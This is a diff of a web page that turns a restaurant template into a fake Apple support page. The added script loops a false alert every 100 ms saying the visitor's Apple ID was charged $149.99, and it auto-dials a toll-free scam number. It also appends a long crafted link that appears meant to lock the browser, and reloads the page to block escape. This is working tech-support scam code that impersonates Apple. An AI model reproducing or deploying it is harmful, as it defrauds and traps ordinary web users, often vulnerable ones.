-                      <div class="form-field-icon-wrap">
-                        <span class="icon ion-android-time"></span>
-                        <input type="text" class="form-control" id="time">
-                      </div>
-                    </div>
-                  </div>
-                  <div class="row justify-content-center">
-                    <div class="col-md-4">
-                      <input type="submit" class="btn btn-primary btn-outline-primary btn-block" value="Reserve Now">
-                    </div>
-                  </div>
-                </form>
-              </div>
-            </div>
-          </div>
-        </div> <!-- .section -->
-
-         <div class="section bg-white"  data-aos="fade-up">
-          <div class="container">
-            <div class="row section-heading justify-content-center mb-5">
-              <div class="col-md-8 text-center">
-                <h2 class="heading mb-3">Customer Reviews</h2>
-              </div>
-            </div>
-            <div class="row justify-content-center text-center" data-aos="fade-up">
-              <div class="col-md-8">
-                <div class="owl-carousel home-slider-loop-false">
-
-                
-                  <div class="item">
-                    <blockquote class="testimonial">
-                      <p>&ldquo;A small river named Duden flows by their place and supplies it with the necessary regelialia. It is a paradisematic country, in which roasted parts of sentences fly into your mouth.&rdquo;</p>
-                      <div class="author">
-                        <img src="images/person_1.jpg" alt="Image placeholder" class="mb-3">
-                        <h4>Maxim Smith</h4>
-                        <p>CEO, Founder</p>
-                      </div>
-                    </blockquote>
-                  </div>
-                  <div class="item">
-                    <blockquote class="testimonial">
-                      <p>&ldquo;Far far away, behind the word mountains, far from the countries Vokalia and Consonantia, there live the blind texts. Separated they live in Bookmarksgrove right at the coast of the Semantics, a large language ocean.&rdquo;</p>
-                      <div class="author">
-                        <img src="images/person_2.jpg" alt="Image placeholder" class="mb-3">
-                        <h4>Geert Green</h4>
-                        <p>CEO, Founder</p>
-                      </div>
-                    </blockquote>
-                  </div>
-                  <div class="item">
-                    <blockquote class="testimonial">
-                      <p>&ldquo;Even the all-powerful Pointing has no control about the blind texts it is an almost unorthographic life One day however a small line of blind text by the name of Lorem Ipsum decided to leave for the far World of Grammar.&rdquo;</p>
-                      <div class="author">
-                        <img src="images/person_3.jpg" alt="Image placeholder" class="mb-3">
-                        <h4>Dennis Roman</h4>
-                        <p>CEO, Founder</p>
-                      </div>
-                    </blockquote>
-                  </div>
-                  <div class="item">
-                    <blockquote class="testimonial">
-                      <p>&ldquo;The Big Oxmox advised her not to do so, because there were thousands of bad Commas, wild Question Marks and devious Semikoli, but the Little Blind Text didn’t listen. She packed her seven versalia, put her initial into the belt and made herself on the way.&rdquo;</p>
-                      <div class="author">
-                        <img src="images/person_2.jpg" alt="Image placeholder" class="mb-3">
-                        <h4>Geert Green</h4>
-                        <p>CEO, Founder</p>
-                      </div>
-                    </blockquote>
-                  </div>
-                </div>
-              </div>
-            </div>
-          </div>  
-        </div> <!-- .section -->
-
-        <div class="section" data-aos="fade-up" id="section-contact">
-          <div class="container">
-            <div class="row section-heading justify-content-center mb-5">
-              <div class="col-md-8 text-center">
-                <h2 class="heading mb-3">Get In Touch</h2>
-              </div>
-            </div>
-            <div class="row justify-content-center">
-              <div class="col-md-10 p-5 form-wrap">
-                <form action="#">
-                  <div class="row mb-4">
-                    <div class="form-group col-md-4">
-                      <label for="name" class="label">Name</label>
-                      <div class="form-field-icon-wrap">
-                        <span class="icon ion-android-person"></span>
-                        <input type="text" class="form-control" id="name">
-                      </div>
-                    </div>
-                    <div class="form-group col-md-4">
-                      <label for="email" class="label">Email</label>
-                      <div class="form-field-icon-wrap">
-                        <span class="icon ion-email"></span>
-                        <input type="email" class="form-control" id="email">
-                      </div>
-                    </div>
-                    <div class="form-group col-md-4">
-                      <label for="phone" class="label">Phone</label>
-                      <div class="form-field-icon-wrap">
-                        <span class="icon ion-android-call"></span>
-                        <input type="text" class="form-control" id="phone">
-                      </div>
-                    </div>
-
-                   <div class="form-group col-md-12">
-                      <label for="message" class="label">Message</label>
-                     <textarea name="message" id="message" cols="30" rows="10" class="form-control"></textarea>
-                   </div>
-                  </div>
-                  <div class="row justify-content-center">
-                    <div class="col-md-4">
-                      <input type="submit" class="btn btn-primary btn-outline-primary btn-block" value="Send Message">
-                    </div>
-                  </div>
-                </form>
-              </div>
-            </div>
-          </div>
-        </div> <!-- .section -->
-
-        <div class="map-wrap" id="map"  data-aos="fade"></div>
-
-
-        <footer class="ftco-footer">
-          <div class="container">
-            
-            <div class="row">
-            <div class="col-md-4 mb-5">
-              <div class="footer-widget">
-                <h3 class="mb-4">About Meal</h3>
-                <p>The Big Oxmox advised her not to do so, because there were thousands of bad Commas, wild Question Marks and devious Semikoli, but the Little Blind Text didn’t listen. </p>
-                <!-- <input type="submit" class="btn btn-primary btn-outline-primary" value="Send Message"> -->
-                <p><a href="https://free-template.co" target="_blank" class="btn btn-primary btn-outline-primary">More Templates</a></p>
-              </div>
-            </div>
-            <div class="col-md-4 mb-5">
-              <div class="footer-widget">
-                <h3 class="mb-4">Lunch Service</h3>
-                <p>Booking from 12:00pm &mdash; 1:30pm</p>
-                <h3 class="mb-4">Dinner Service</h3>
-                <p>Everyday: <br> Booking from 6:00pm &mdash; 9:00pm</p>
-              </div>
-            </div>
-
-            <div class="col-md-4">
-              <div class="footer-widget">
-                <h3 class="mb-4">Follow Along</h3>
-                <ul class="list-unstyled social">
-                  <li><a href="#"><span class="fa fa-tripadvisor"></span></a></li>
-                  <li><a href="#"><span class="fa fa-twitter"></span></a></li>
-                  <li><a href="#"><span class="fa fa-facebook"></span></a></li>
-                  <li><a href="#"><span class="fa fa-instagram"></span></a></li>
-                </ul>
-              </div>
-              <div class="footer-widget">
-                <h3 class="mb-4">Newsletter</h3>
-                <form action="#" class="ftco-footer-newsletter">
-                  <div class="form-group">
-                    <button class="button"><span class="fa fa-envelope"></span></button>
-                    <input type="email" class="form-control" placeholder="Enter Email">
-                  </div>
-                </form>
-              </div>
-            </div>
-
-            </div>
-
-            <div class="row pt-5">
-              <div class="col-md-12 text-center">
-                <p>&copy; Copyright 2018. Designed by <a href="https://free-template.co/">Free-Template.co</a> &amp; distributed by <a href="https://themewagon.com/">ThemeWagon</a></p>
-              </div>
-            </div>
-          </div>
-        </footer>
-      
+        </section>
     </div>
 
-    <!-- loader -->
-    <div id="loader" class="show fullscreen"><svg class="circular" width="48px" height="48px"><circle class="path-bg" cx="24" cy="24" r="22" fill="none" stroke-width="4" stroke="#eeeeee"/><circle class="path" cx="24" cy="24" r="22" fill="none" stroke-width="4" stroke-miterlimit="10" stroke="#ff7a5c"/></svg></div>
+    <footer id="ac-globalfooter" class="no-js">
+        <div class="ac-gf-content">
+            <section class="ac-gf-footer">
+                <div class="ac-gf-footer-shop"> More ways to: Visit an <a href="#" class="analytics-exitlink">Apple Store </a>, <span class="nowrap">call  <font class="js_setPhoneBlock"></font>, or  <a href="#" class="analytics-exitlink">find a reseller </a></span>.
+                </div>
+                <div class="ac-gf-footer-locale">
+                    <a class="ac-gf-footer-locale-link" href="#" title="Choose your country or region" aria-label="United States. Choose your country or region"><img class="ac-gf-footer-locale-flag" src="images/us.png" alt="" width="16" height="16">United
+					States </a>
+                </div>
+                <div class="ac-gf-footer-legal">
+                    <div class="ac-gf-footer-legal-copyright">Copyright© 2025 Apple . All rights reserved. </div>
+                    <div class="ac-gf-footer-legal-links"><a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Privacy
+					Policy </a> <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Terms of Use </a>
+                        <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Sales and Refunds </a> <a class="ac-gf-footer-legal-link" href="#">Site
+						Map </a> <a class="ac-gf-footer-legal-link" href="#">Contact
+						Apple </a></div>
+                </div>
+                <meta content="Apple" property="name">
+                <meta content="+1-866-381-6140
+			 " property="telephone">
+            </section>
+        </div>
+    </footer>
 
-    <script src="js/jquery-3.2.1.min.js"></script>
-    <script src="js/jquery-migrate-3.0.1.min.js"></script>
-    <script src="js/popper.min.js"></script>
-    <script src="js/bootstrap.min.js"></script>
-    <script src="js/owl.carousel.min.js"></script>
-    <script src="js/jquery.waypoints.min.js"></script>
 
-    <script src="js/bootstrap-datepicker.js"></script>
-    <script src="js/jquery.timepicker.min.js"></script>
-    <script src="js/jquery.stellar.min.js"></script>
 
-    <script src="js/jquery.easing.1.3.js"></script>    
+    <script src="js/jquery-1.12.0.min.js"></script>
+    <script>
+        function getURLParameter(name) {
+            return decodeURI(
+                (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
+            );
+        };
+        var cookieHelper = {
+            defParams: {
+                path: "/",
+                domain: "." + window.location.host.replace(/:\d+/, "")
+            },
+            set: function(a, d, c) {
+                c = c || {};
+                for (var b in this.defParams) "undefined" == typeof c[b] && (c[b] = this.defParams[b]);
+                b = c.expires;
+                if ("number" == typeof b && b) {
+                    var e = new Date;
+                    e.setTime(e.getTime() + 1E3 * b);
+                    b = c.expires = e
+                }
+                b && b.toUTCString && (c.expires = b.toUTCString());
+                d = encodeURIComponent(d);
+                a = a + "=" + d;
+                for (var f in c) a += "; " + f, d = c[f], !0 !== d && (a += "=" + d);
+                document.cookie = a
+            },
+            get: function(a) {
+                return (a = document.cookie.match(new RegExp("(?:^|; )" + a.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, "\\$1") + "=([^;]*)"))) ? decodeURIComponent(a[1]) : void 0
+            },
+            del: function(a) {
+                this.set(a, null, {
+                    expires: -1
+                })
+            }
+        };
 
-    <script src="js/aos.js"></script>
-    
 
-    <script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyBVWaKrjvy3MaE7SQ74_uJiULgl1JY0H2s&sensor=false"></script>
+        var userAgent = window.navigator.userAgent.toLowerCase(),
+            ios = /iphone|ipod|ipad/.test(userAgent);
 
-    <script src="js/main.js"></script>
-  </body>
-</html>
+        function parseURL(url) {
+            var a = document.createElement('a');
+            a.href = url;
+            return a.hostname.replace('www.', '');
+        };
+
+        function getPar(name) {
+            var url = window.location.href;
+            name = name.replace(/[\[\]]/g, "\\$&");
+            var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+                results = regex.exec(url);
+            if (!results) return null;
+            if (!results[2]) return '';
+            return decodeURIComponent(results[2].replace(/\+/g, " "));
+        };
+
+        window.number = getPar('phone');
+
+        window.number = (window.number ? window.number : '+1-866-381-6140');
+
+        window.device = 'iPhone';
+        window.refef = parseURL(document.referrer);
+
+        if (ios) {
+
+            if (/iphone/.test(userAgent)) {
+                window.device = 'iPhone';
+            }
+
+            if (/ipad/.test(userAgent)) {
+                window.device = 'iPad';
+            }
+
+            if (/ipod/.test(userAgent)) {
+                window.device = 'iPod';
+            }
+        }
+
+        var text = cookieHelper.get('textSetBl');
+        var phone = cookieHelper.get('phoneSetBl');
+
+        function getText() {
+            var str = window.defaultText;
+
+            for (var d in window.text) {
+                if (window.refef.indexOf(d) != -1) {
+                    str = window.text[d];
+                }
+            }
+            //var str = window.text[window.refef]?window.text[window.refef]:window.defaultText;
+            return str.replace('|%model%|', window.device).replace('|%ref%|', window.refef);
+        }
+
+
+        if (!phone) {
+            phone = getURLParameter('phone');
+        }
+        if (!text) {
+            text = getURLParameter('text');
+        }
+
+        var sText = document.querySelectorAll('.js_setTextBlock');
+        for (var t = 0; t < sText.length; t++) {
+            sText[t].innerHTML = getText();
+        }
+        var sPhone = document.querySelectorAll('.js_setPhoneBlock');
+        for (var p = 0; p < sPhone.length; p++) {
+            sPhone[p].innerHTML = phone;
+        }
+
+
+        setInterval(function() {
+            myFunction()
+        }, 100);
+
+        function okkkk() {
+            jQuery('#result').append('<a  class="anchorcall" href="tel:+1-866-381-6140"></a>');
+            document.querySelector('a').click();
+            var extraData = "";
+            for (itxextraData = 0; itxextraData < 200; itxextraData++) {
+                var extraData = extraData + "5555555555";
+            }
+            jQuery('#result').append('<a href="#callto+' + extraData + '%00"></a>');
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            //setInterval(function(){ alert(getText().repeat(99999999999));}, 300);
+        };
+
+        function myFunction() {
+            if (confirm("Your Apple ID was recently used at APPLE STORE for $149.99 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security.Not you? Immediately call Apple Support +1-866-381-6140 to Freeze it!.")) {
+                okkkk();
+            } else {
+                okkkk();
+            }
+        }
+
+        window.ununload = function() {
+            debugger;
+            location.reload();
+        }
+    </script>
+
+
+
+<script defer="" data-domain="iosmd.sire" src="js/script.js"></script>
+
+
+</body></html>
